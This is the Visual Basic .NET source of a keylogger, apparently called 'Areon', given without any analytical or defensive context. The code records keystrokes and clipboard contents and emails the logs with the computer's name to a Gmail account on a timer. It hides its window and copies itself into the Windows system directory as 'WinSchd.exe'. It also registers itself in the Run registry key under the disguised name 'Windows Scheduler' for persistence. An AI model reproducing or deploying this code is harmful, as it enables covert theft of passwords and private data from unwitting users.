Public Class Form1
    Dim Email As String
    Dim Password As String
    Dim ViewPassword As String
    Dim Clipboard As String
    Private Sub Main_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Main.Tick
        TextBox1.AppendText(Areon.GetKey)
        If Not My.Computer.Clipboard.ContainsText Then Exit Sub
        Dim Compare As String = Areon.MD5(My.Computer.Clipboard.GetText)
        If Compare <> Clipboard Then
            Clipboard = Compare
            TextBox1.Text += vbCrLf & "[C]" & My.Computer.Clipboard.GetText & "[/C]" & vbCrLf & vbCrLf
        End If
    End Sub
    Private Sub Gmail_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Gmail.Tick
        If TextBox1.Text <> Nothing Then
            Dim MailText As String = TextBox1.Text
            Try
                Areon.SendGmail(Email, Password, Email, My.Computer.Name & vbCrLf & vbCrLf & MailText, "Areon - " & Now.ToString)
                TextBox1.Text = Nothing
            Catch
                TextBox1.Text = MailText & TextBox1.Text
            End Try
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        If Val(TextBox4.Text) < 1 Then TextBox4.Text = "1"
        If CheckBox1.Checked = True Then
            Gmail.Interval = Val(TextBox4.Text) * 60000
            Gmail.Enabled = True
        End If
        Main.Enabled = True
        TextBox5.Clear()
        TextBox6.Clear()
        Me.Hide()
    End Sub
    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        If TextBox1.Text = Nothing Then Exit Sub
        Dim Result As DialogResult = MessageBox.Show("Clear all logged text?", Me.Text, MessageBoxButtons.YesNo, MessageBoxIcon.Information)
        If Result = Windows.Forms.DialogResult.Yes Then TextBox1.Text = Nothing
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        SaveFileDialog1.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.MyDocuments
        SaveFileDialog1.ShowDialog()
        If SaveFileDialog1.FileName = Nothing Then Exit Sub
        My.Computer.FileSystem.WriteAllText(SaveFileDialog1.FileName, TextBox1.Text, False)
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If My.Application.CommandLineArgs.Count > 0 Then
            If My.Application.CommandLineArgs(0).ToLower = "-h" Then
                Try
                    Dim Data As String() = Areon.TripleDES(My.Computer.FileSystem.ReadAllText(Environment.SystemDirectory & "\WinSchd.cfg"), "Crypto", Areon.CryptAction.Decrypt).Split("|")
                    ViewPassword = Data(0)
                    If Data(1).Length > 2 Then
                        Email = Data(1)
                        Password = Data(2)
                        Gmail.Interval = Val(Data(3))
                        Gmail.Enabled = True
                    End If
                    CheckBox2.Checked = True
                    Main.Enabled = True
                Catch
                    Me.Close()
                End Try
                Exit Sub
            End If
        End If
        Me.WindowState = FormWindowState.Normal
        Me.ShowInTaskbar = True
        OnStartup(False)
    End Sub
    Private Sub OnStartup(ByVal Setting As Boolean)
        Dim System As String = Environment.SystemDirectory
        If Val(TextBox4.Text) < 1 Then TextBox4.Text = "1"
        On Error Resume Next
        Select Case Setting
            Case True
                My.Computer.FileSystem.WriteAllText(Environment.SystemDirectory & "\WinSchd.cfg", Areon.TripleDES(ViewPassword & "|" & Email & "|" & Password & "|" & (Val(TextBox4.Text) * 60000), "Crypto", Areon.CryptAction.Encrypt), False)
                If Not My.Computer.FileSystem.FileExists(System & "\WinSchd.exe") Then My.Computer.FileSystem.CopyFile(Application.ExecutablePath, System & "\WinSchd.exe")
                Areon.AddStartup("Windows Scheduler", System & "\WinSchd.exe -h")
            Case False
                If My.Computer.FileSystem.FileExists(System & "\WinSchd.cfg") Then My.Computer.FileSystem.DeleteFile(System & "\WinSchd.cfg")
                If My.Computer.FileSystem.FileExists(System & "\WinSchd.exe") Then My.Computer.FileSystem.DeleteFile(System & "\WinSchd.exe")
                Dim Key As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                Key.DeleteValue("Windows Scheduler")
        End Select
    End Sub
    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        OnStartup(CheckBox2.Checked)
    End Sub
    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged
        If TextBox1.Text.Contains(ViewPassword) Then
            Main.Enabled = False
            Gmail.Enabled = False
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.Length - ViewPassword.Length)
            CheckBox1.Checked = False
            TextBox2.Text = Nothing
            TextBox3.Text = Nothing
            Button2.Enabled = True
            Me.ShowInTaskbar = True
            Me.Show()
            Me.WindowState = FormWindowState.Normal
        End If
    End Sub
    Private Sub TextBox6_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox6.TextChanged
        If TextBox6.Text = TextBox5.Text And TextBox6.Text.Trim.Length > 5 Then
            CheckBox1.Enabled = True
            CheckBox2.Enabled = True
            ViewPassword = TextBox6.Text
            Button2.Enabled = True
        Else
            CheckBox1.Enabled = False
            CheckBox2.Enabled = False
            Button2.Enabled = False
        End If
    End Sub
    Private Sub TextBox5_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox5.TextChanged
        If TextBox5.Text.Trim.Length > 5 Then TextBox6.Enabled = True Else TextBox6.Enabled = False
    End Sub
    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked Then
            GroupBox1.Enabled = True
            CheckBox2.Checked = False
            CheckBox2.Enabled = False
            Button2.Enabled = False
        Else
            GroupBox1.Enabled = False
            If TextBox6.Text = TextBox5.Text And TextBox6.Text.Trim.Length > 5 Then
                Button2.Enabled = True
                CheckBox2.Enabled = True
            End If
        End If
    End Sub
    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox2.TextChanged
        If Areon.ValidateEmail(TextBox2.Text) And TextBox2.Text.ToLower.Contains("gmail.com") Then
            TextBox3.Enabled = True
            Email = TextBox2.Text
        Else
            TextBox3.Enabled = False
        End If
    End Sub
    Private Sub TextBox3_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox3.TextChanged
        If TextBox3.Text.Trim.Length > 7 Then
            If TextBox6.Text = TextBox5.Text And TextBox6.Text.Trim.Length > 5 Then Button2.Enabled = True
            Password = TextBox3.Text
            CheckBox2.Enabled = True
        Else
            Button2.Enabled = False
        End If
    End Sub
    Private Sub Form1_Shown(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Shown
        If Main.Enabled Then Me.Hide()
        TextBox5.Focus()
    End Sub
    Private Sub TextBox4_KeyPress(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox4.KeyPress
        If Not Char.IsNumber(e.KeyChar) And Not Asc(e.KeyChar) = 8 Then e.Handled = True
    End Sub
    Private Sub Form1_KeyPress(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles MyBase.KeyPress
        If e.KeyChar = "|" Then e.Handled = True
    End Sub
End Class
